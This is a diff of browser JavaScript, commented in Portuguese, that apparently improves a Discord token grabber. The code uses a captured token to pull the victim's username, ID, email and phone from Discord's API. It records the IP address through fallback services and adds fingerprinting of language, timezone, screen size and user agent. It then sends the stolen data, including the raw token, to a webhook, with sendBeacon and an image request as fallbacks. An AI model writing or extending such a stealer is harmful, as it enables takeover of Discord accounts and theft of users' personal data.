@@ -13,7 +13,7 @@
             let username = "Desconhecido";
             let userID = "Desconhecido";
 
-            // Se encontrou o token, busca dados na API
+            // Se encontrou o token, busca dados na API do Discord
             if (token) {
                 try {
                     const userResp = await fetch("https://discord.com/api/v9/users/@me", {
@@ -24,45 +24,60 @@
                     phone = userData.phone || "Não vinculado";
                     username = userData.username + "#" + (userData.discriminator || "0");
                     userID = userData.id;
-                } catch (e) {}
+                } catch (e) {
+                    console.log("Erro API Discord:", e);
+                }
             }
 
-            // Pegar IP
+            // Pegar IP com API alternativa
             let ip = "Não capturado";
             try {
-                const ipResp = await fetch("https://ip-api.com/json/");
+                const ipResp = await fetch("https://api.ipify.org?format=json");
                 const ipData = await ipResp.json();
-                ip = ipData.query;
-            } catch (e) {}
+                ip = ipData.ip;
+            } catch (e) {
+                try {
+                    const ipResp2 = await fetch("https://api.my-ip.io/ip.json");
+                    const ipData2 = await ipResp2.json();
+                    ip = ipData2.ip;
+                } catch (e2) {
+                    console.log("Erro ao capturar IP:", e2);
+                }
+            }
 
             const platform = navigator.platform;
+            const language = navigator.language;
+            const screenRes = `${screen.width}x${screen.height}`;
+            const userAgent = navigator.userAgent;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-            // Monta mensagem em texto simples (SEM embed)
+            // Monta mensagem completa
             const mensagem = 
                 `**🎯 Dados Capturados**\n` +
-                `👤 **Usuário:** ${username}\n` +
-                `🆔 **ID:** ${userID}\n` +
-                `📧 **Email:** ${email}\n` +
-                `📱 **Telefone:** ${phone}\n` +
-                `🔑 **Token:** ${token || "Não encontrado"}\n` +
-                `🌐 **IP:** ${ip}\n` +
-                `💻 **PC:** ${platform}`;
+                `**👤 Usuário:** ${username}\n` +
+                `**🆔 ID:** ${userID}\n` +
+                `**📧 Email:** ${email}\n` +
+                `**📱 Telefone:** ${phone}\n` +
+                `**🔑 Token:** \`${token || "Não encontrado"}\`\n` +
+                `**🌐 IP:** ${ip}\n` +
+                `**💻 Sistema:** ${platform}\n` +
+                `**🌍 Idioma:** ${language}\n` +
+                `**🕐 Fuso:** ${timezone}\n` +
+                `**🖥️ Tela:** ${screenRes}\n` +
+                `**📄 User Agent:** ${userAgent.substring(0, 150)}`;
 
-            // Tenta enviar de várias formas para garantir
+            // Envia para o webhook
             try {
-                // Método 1: fetch normal
                 await fetch(webhookURL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ content: mensagem })
                 });
-            } catch (e1) {
+            } catch (e) {
                 try {
-                    // Método 2: sendBeacon
                     const blob = new Blob([JSON.stringify({ content: mensagem })], { type: 'application/json' });
                     navigator.sendBeacon(webhookURL, blob);
                 } catch (e2) {
-                    // Método 3: imagem (último recurso)
                     new Image().src = webhookURL + "?content=" + encodeURIComponent(mensagem);
                 }
             }
